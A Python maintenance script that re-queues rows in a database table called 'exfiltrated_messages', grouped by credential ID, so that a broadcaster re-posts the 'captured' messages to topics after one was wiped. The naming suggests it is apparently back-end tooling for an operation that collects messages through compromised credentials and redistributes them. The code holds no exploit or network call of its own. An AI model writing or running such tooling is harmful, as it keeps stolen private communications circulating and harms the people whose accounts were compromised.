"""Re-queue recently captured messages so their topics are repopulated.

Use after a topic was wiped: it flips ``is_broadcasted`` back to false for the
newest N messages of the most recently active M credentials, which lets the
normal broadcaster re-post them (with rate limiting).

Dry-run by default; pass --apply to write.
"""

from __future__ import annotations

import argparse
import asyncio
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[2]))

from app.core.database import db
from app.infrastructure.database import execute_async


async def run(
    credentials: int, per_credential: int, apply: bool, since_days: int | None = None
) -> int:
    seen: list[str] = []
    cursor = None
    while len(seen) < credentials:
        query = (
            db.table("exfiltrated_messages")
            .select("credential_id,created_at")
            .order("created_at", desc=True)
            .limit(300)
        )
        if cursor:
            query = query.lt("created_at", cursor)
        page = await execute_async(query)
        rows = page.data or []
        if not rows:
            break
        cursor = rows[-1].get("created_at")
        for row in rows:
            cid = row.get("credential_id")
            if cid and cid not in seen:
                seen.append(cid)
            if len(seen) >= credentials:
                break

    total = 0
    for cid in seen:
        query = (
            db.table("exfiltrated_messages")
            .select("id")
            .eq("credential_id", cid)
            .order("created_at", desc=True)
            .limit(per_credential)
        )
        if since_days is not None:
            from datetime import UTC, datetime, timedelta

            query = query.gte(
                "created_at", (datetime.now(UTC) - timedelta(days=since_days)).isoformat()
            )
        rows = await execute_async(query)
        ids = [r["id"] for r in rows.data or []]
        if not ids:
            continue
        total += len(ids)
        print(f"  credential {cid[:8]}… -> {len(ids)} message(s)")
        if apply:
            await execute_async(
                db.table("exfiltrated_messages")
                .update(
                    {
                        "is_broadcasted": False,
                        "broadcasted_at": None,
                        "broadcast_message_id": None,
                        "broadcast_status": None,
                    }
                )
                .in_("id", ids)
            )

    print(f"\n{'Re-queued' if apply else 'Would re-queue'} {total} message(s) across {len(seen)} credential(s)")
    return 0 if apply else 1


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--credentials", type=int, default=30)
    parser.add_argument("--per-credential", type=int, default=15)
    parser.add_argument("--apply", action="store_true")
    parser.add_argument(
        "--since-days",
        type=int,
        default=None,
        help="only re-queue messages newer than N days (default: the newest N per topic)",
    )
    args = parser.parse_args(argv)
    if not args.apply:
        print("Dry run. Pass --apply to re-queue.\n")
    return asyncio.run(
        run(args.credentials, args.per_credential, args.apply, args.since_days)
    )


if __name__ == "__main__":
    sys.exit(main())
